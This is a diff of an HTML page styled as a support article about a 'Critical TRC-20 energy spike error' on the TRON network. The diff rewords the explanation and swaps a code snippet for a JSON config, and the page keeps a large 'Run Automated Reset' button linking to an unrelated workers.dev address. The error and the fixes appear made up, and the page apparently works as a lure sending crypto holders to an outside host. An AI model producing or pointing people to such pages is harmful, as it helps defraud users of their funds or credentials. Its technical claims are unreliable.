@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #00adb5;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,35 +41,30 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an abnormal increase in energy consumption by a TRC-20 smart contract on the TRON network.</li>
+<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an unexpected surge in energy consumption by a TRC-20 smart contract on the TRON network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an unexpected surge in energy usage, often caused by inefficient contract code, excessive loop iterations, or an unusually high volume of transactions.</li>
+<li>This error occurs when a TRC-20 smart contract exceeds its allocated energy limit, causing the contract execution to fail and resulting in the error message.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the contract's energy limit to prevent excessive consumption:</li>
-<li>Increase the <code>energyLimit</code> parameter in the contract deployment script</li>
-<li>Optimize contract code to reduce computational complexity</li>
-<li>Implement rate limiting to throttle transaction volumes</li>
+<li>Adjust the contract's energy limit by modifying the <code>energyLimit</code> parameter in the contract's configuration.</li>
+<li>Optimize the contract's code to reduce energy consumption by minimizing computational complexity and data storage.</li>
+<li>Update the contract's energy parameters using the following JSON configuration:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tronweb.txBuilder.createSmartContract<span class="o">(</span>
-<span class="w">  </span><span class="s2">&quot;contract_address&quot;</span>,
-<span class="w">  </span><span class="s2">&quot;contract_abi&quot;</span>,
-<span class="w">  </span><span class="o">{</span>
-<span class="w">    </span><span class="s2">&quot;feeLimit&quot;</span>:<span class="w"> </span><span class="m">100000000</span>,
-<span class="w">    </span><span class="s2">&quot;energyLimit&quot;</span>:<span class="w"> </span><span class="m">100000000</span>
-<span class="w">  </span><span class="o">}</span>
-<span class="o">)</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;energyFee&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and contract optimization. </p>
+<p>Consider utilizing an external console for further debugging and testing.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Familiarity with TRON's smart contract development framework</li>
-<li>Understanding of energy consumption mechanics on the TRON network</li>
-<li>Access to the TRONWeb library for contract deployment and management</li>
+<li>Familiarity with TRON's smart contract architecture</li>
+<li>Understanding of energy management on the TRON network</li>
+<li>Access to the contract's source code and configuration files</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
